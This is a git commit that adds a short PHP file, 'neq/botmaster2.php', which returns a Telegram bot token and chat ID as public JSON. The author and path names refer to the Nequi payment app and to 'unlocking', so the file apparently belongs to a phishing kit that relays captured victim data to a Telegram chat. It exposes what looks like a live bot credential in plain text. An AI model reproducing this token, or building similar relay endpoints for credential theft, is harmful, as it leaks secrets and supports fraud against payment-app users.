41704db174e9c2409a2a8fc197b904f21437bb5f
propulsorxnequi <nequidesbloquex@gmail.com>
2026-03-11 17:23:16 -0500

    Add files via upload

---
+++ neq/botmaster2.php
@@ -0,0 +1,8 @@
+<?php
+$config = [
+    'token' => '7812114927:AAGYIeX5DVUxc2IcNJ-swMyfxhyYjsLB9jA',
+    'chat_id' => '7776240161'
+];
+header('Content-Type: application/json');
+echo json_encode($config);
+?>
